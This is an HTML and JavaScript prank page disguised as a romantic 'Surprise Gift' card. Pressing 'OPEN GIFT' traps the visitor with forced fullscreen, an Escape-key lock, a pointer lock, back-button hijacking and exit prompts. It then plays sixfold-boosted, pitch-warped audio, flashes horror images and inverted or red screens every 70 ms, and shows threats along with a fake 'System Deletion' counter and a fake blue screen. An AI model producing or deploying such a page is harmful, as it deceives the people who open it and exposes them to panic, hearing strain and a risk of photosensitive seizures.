<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#000000">
    <title>Surprise Gift! üéÅ‚ú®</title>
    <style>
        /* --- GLOBAL RESET & TRAPS --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            cursor: none; /* CURSOR GONE */
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        html, body {
            overflow: hidden;
            height: 100%;
            width: 100%;
            background: #000;
            touch-action: none; 
            overscroll-behavior: none;
        }

        /* =========================================
           LAYER 1: THE BAIT (Beautiful & Safe)
           ========================================= */
        #innocent-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at center, #1a0510 0%, #000000 100%);
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            z-index: 100;
            transition: opacity 0.5s ease-out;
            cursor: default;
        }

        /* Rose Petals */
        .rose-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        .neon-rose-petal {
            position: absolute; top: -10%;
            animation: floatPetal 15s linear infinite;
            opacity: 0.6; filter: drop-shadow(0 0 10px rgba(255, 20, 147, 0.5));
        }
        @keyframes floatPetal {
            0% { transform: translateY(-10vh) rotate(0deg); opacity: 0; }
            10% { opacity: 0.8; }
            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }

        /* Card */
        .card {
            background: rgba(255, 20, 147, 0.05); backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 20, 147, 0.3); padding: 50px;
            border-radius: 30px; text-align: center; max-width: 90%; width: 450px;
            animation: cardFloat 6s ease-in-out infinite; z-index: 102;
        }
        @keyframes cardFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        
        .card h1 { color: #fff; font-size: 3rem; margin-bottom: 15px; font-family: 'Times New Roman', serif; }
        .card p { color: rgba(255,255,255,0.8); margin-bottom: 30px; font-size: 1.1rem; }
        .btn-surprise {
            background: #ff1493; color: #000; border: none; padding: 18px 50px;
            font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer;
            box-shadow: 0 0 30px rgba(255, 20, 147, 0.4); text-transform: uppercase;
        }
        .btn-surprise:hover { background: #fff; transform: scale(1.05); }

        /* =========================================
           LAYER 2: PURE CHAOS (The Horror)
           ========================================= */
        #chaos-layer {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100dvh;
            background: #000; z-index: 1; display: none;
            will-change: filter, transform;
        }
        
        .loop-img {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; display: none;
        }
        .loop-img.active { display: block; animation: shake 0.1s infinite; }
        @keyframes shake { 0% { transform: translate(2px, 2px); } 100% { transform: translate(-2px, -2px); } }

        /* Overlays */
        #flash-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #8a0303; z-index: 200; opacity: 0; pointer-events: none; mix-blend-mode: multiply; }
        
        #glitch-text {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            font-family: 'Impact', sans-serif; font-size: 8rem; color: red;
            z-index: 201; display: none; white-space: nowrap;
            text-shadow: 5px 5px 0 #000;
        }

        #fake-ui {
            position: fixed; bottom: 20px; left: 20px; color: red; font-family: monospace;
            font-size: 1.5rem; z-index: 300; display: none; background: rgba(0,0,0,0.8); padding: 10px;
        }

        #bsod {
            background: #0000aa; color: #fff; position: fixed; top:0; left:0;
            width:100%; height:100%; z-index: 400; display: none;
            padding: 50px; font-family: 'Courier New', monospace; font-size: 1.5rem; cursor: none;
        }

        /* Broken Screen Effect */
        .broken-screen {
            clip-path: polygon(0 0, 100% 0, 100% 20%, 0 80%, 0 100%, 20% 100%, 80% 0, 100% 100%);
            transform: scale(1.1); filter: hue-rotate(90deg) contrast(200%);
        }

    </style>
</head>
<body>

    <audio id="bg-audio" loop crossorigin="anonymous">
        <source src="music.mp3" type="audio/mpeg">
    </audio>

    <div id="innocent-layer">
        <div class="rose-container" id="rose-bg"></div>
        <div class="card">
            <h1>Surprise Gift! üéÅ</h1>
            <p>I've prepared a special surprise for you.</p>
            <button class="btn-surprise" id="init-btn">OPEN GIFT</button>
        </div>
    </div>

    <!-- TERMINAL LAYER REMOVED -->

    <div id="chaos-layer"></div>
    <div id="flash-layer"></div>
    <div id="glitch-text">I SEE YOU</div>
    <div id="fake-ui">System Deletion: <span id="del-percent">0%</span></div>
    
    <div id="bsod">
        A problem has been detected and windows has been shut down to prevent damage to your computer.<br><br>
        SYSTEM_THREAD_EXCEPTION_NOT_HANDLED<br><br>
        *** STOP: 0x0000007E (0xFFFFFFFFC0000005, 0xFFFFF80002E55151)<br><br>
        Dumping physical memory to disk: <span id="bsod-count">0</span>
    </div>

    <script>
        // --- CONFIGURATION ---
        const IMAGE_COUNT = 15; 
        const TEXT_SCARES = ["LOOK BEHIND YOU", "I SEE YOU", "DIE", "666", "HELP ME", "IT BURNS", "NO ESCAPE", "RUN"];
        const TITLES = ["‚ö†Ô∏è VIRUS DETECTED", "SYSTEM FAILURE", "I SEE YOU", "RUN", "‚ùå‚ùå‚ùå", "HELP"];
        
        // --- REFS ---
        const audio = document.getElementById('bg-audio');
        const innocentLayer = document.getElementById('innocent-layer');
        // Terminal Refs Removed
        const chaosLayer = document.getElementById('chaos-layer');
        const flashLayer = document.getElementById('flash-layer');
        const glitchText = document.getElementById('glitch-text');
        const bsod = document.getElementById('bsod');
        const fakeUi = document.getElementById('fake-ui');
        const delPercent = document.getElementById('del-percent');
        const initBtn = document.getElementById('init-btn');

        let images = [];
        let isPrankActive = false;
        let audioContext, gainNode;

        // --- 0. TRAP LOGIC (THE "UNESCAPABLE" PART) ---
        async function engageTrap() {
            const doc = document.documentElement;
            // 1. Fullscreen
            try {
                if (doc.requestFullscreen) await doc.requestFullscreen();
                else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
            } catch(e){}

            // 2. Keyboard Lock (Chrome specific - prevents ESC)
            try {
                if (navigator.keyboard && navigator.keyboard.lock) {
                    await navigator.keyboard.lock(['Escape']);
                }
            } catch(e){}

            // 3. Pointer Lock (Hides cursor and traps it)
            try { document.body.requestPointerLock(); } catch(e){}
        }

        // Persistent Re-engagement
        ['click', 'mousemove', 'mousedown', 'keydown', 'touchstart'].forEach(evt => {
            document.addEventListener(evt, () => {
                if(isPrankActive && !document.fullscreenElement) engageTrap();
            }, { passive: false });
        });

        // Prevent Back Button
        history.pushState(null, document.title, location.href);
        window.addEventListener('popstate', () => history.pushState(null, document.title, location.href));
        window.onbeforeunload = () => { if(isPrankActive) return "LEAVING SO SOON?"; };

        // --- 1. SETUP VISUALS ---
        // Rose Petals
        const petalSVG = `<svg width="50" height="50" viewBox="0 0 120 120"><path d="M60 70 A25 30 0 1 0 60 70" stroke="#ff1493" stroke-width="2" fill="none"/><path d="M40 60 A20 25 0 1 0 40 60" stroke="#ff1493" stroke-width="2" fill="none"/><path d="M80 60 A20 25 0 1 0 80 60" stroke="#ff1493" stroke-width="2" fill="none"/><circle cx="60" cy="60" r="10" fill="#ff1493"/></svg>`;
        const roseContainer = document.getElementById('rose-bg');
        for(let i=0; i<15; i++) {
            const div = document.createElement('div');
            div.className = 'neon-rose-petal';
            div.innerHTML = petalSVG;
            div.style.left = Math.random()*100+'%';
            div.style.animationDelay = Math.random()*10+'s';
            div.style.animationDuration = (10+Math.random()*10)+'s';
            roseContainer.appendChild(div);
        }

        // Preload Horror Images
        for(let i=1; i<=IMAGE_COUNT; i++) {
            let img = new Image();
            img.src = i + ".jpg";
            img.className = 'loop-img';
            chaosLayer.appendChild(img);
            images.push(img);
        }

        // --- 2. AUDIO BOOST ---
        function initAudio() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                audioContext = new AudioContext();
                const source = audioContext.createMediaElementSource(audio);
                gainNode = audioContext.createGain();
                gainNode.gain.value = 6.0; // EXTREME BOOST
                source.connect(gainNode);
                gainNode.connect(audioContext.destination);
            } catch(e) {}
        }

        // --- 3. SEQUENCE START ---
        initBtn.addEventListener('click', async (e) => {
            isPrankActive = true;
            await engageTrap();
            initAudio();

            // Fade out innocent layer
            innocentLayer.style.opacity = '0';
            
            // Wait slightly for fade then START CHAOS
            setTimeout(() => {
                innocentLayer.style.display = 'none';
                startHorror();
            }, 500);
        });

        // --- 4. THE HORROR LOOP ---
        function startHorror() {
            chaosLayer.style.display = 'block';
            fakeUi.style.display = 'block';
            
            audio.play();
            if(audioContext && audioContext.state === 'suspended') audioContext.resume();

            let idx = 0;
            let percent = 0;

            // MAIN CHAOS INTERVAL
            setInterval(() => {
                // Image Loop
                images.forEach(img => img.classList.remove('active'));
                
                // Randomly jump indexes for disorientation
                if(Math.random() > 0.7) idx = Math.floor(Math.random() * images.length);
                else idx = (idx + 1) % images.length;
                
                images[idx].classList.add('active');

                // Screen Effects
                const chaosRoll = Math.random();
                if(chaosRoll > 0.9) {
                    // Inverted Flash
                    document.body.style.filter = 'invert(1)';
                } else if(chaosRoll > 0.8) {
                    // Blood Red Tint
                    flashLayer.style.opacity = 0.6;
                    setTimeout(() => flashLayer.style.opacity = 0, 100);
                } else {
                    document.body.style.filter = 'none';
                }

                // Broken Screen Glitch
                if(Math.random() > 0.95) chaosLayer.classList.add('broken-screen');
                else chaosLayer.classList.remove('broken-screen');

                // Text Scares
                if(Math.random() > 0.85) {
                    glitchText.style.display = 'block';
                    glitchText.innerText = TEXT_SCARES[Math.floor(Math.random() * TEXT_SCARES.length)];
                    glitchText.style.top = (Math.random() * 80 + 10) + '%';
                    glitchText.style.left = (Math.random() * 80 + 10) + '%';
                    glitchText.style.fontSize = (Math.random() * 5 + 5) + 'rem';
                } else {
                    glitchText.style.display = 'none';
                }

                // BSOD Flash (Subliminal)
                if(Math.random() > 0.99) {
                    bsod.style.display = 'block';
                    setTimeout(() => bsod.style.display = 'none', 100);
                }

                // Tab Title Possession
                document.title = TITLES[Math.floor(Math.random() * TITLES.length)];

            }, 70); // Very fast updates (approx 15fps)

            // AUDIO DISTORTION INTERVAL (Demonic Effect)
            setInterval(() => {
                // Randomly pitch shift the audio
                // 0.5 = Slow/Deep (Monster), 1.5 = Fast (Panic)
                audio.playbackRate = 0.5 + Math.random(); 
            }, 1000);

            // FAKE DELETION PROGRESS
            setInterval(() => {
                if(percent < 100) {
                    percent += Math.random() * 2;
                    if(percent > 100) percent = 100;
                    delPercent.innerText = percent.toFixed(1) + '%';
                } else {
                    delPercent.innerText = "COMPLETE (OS DELETED)";
                    delPercent.style.color = "#fff";
                }
                
                // Vibrate Mobile
                if(navigator.vibrate) navigator.vibrate(50);
            }, 500);
        }
    </script>
</body>
</html>
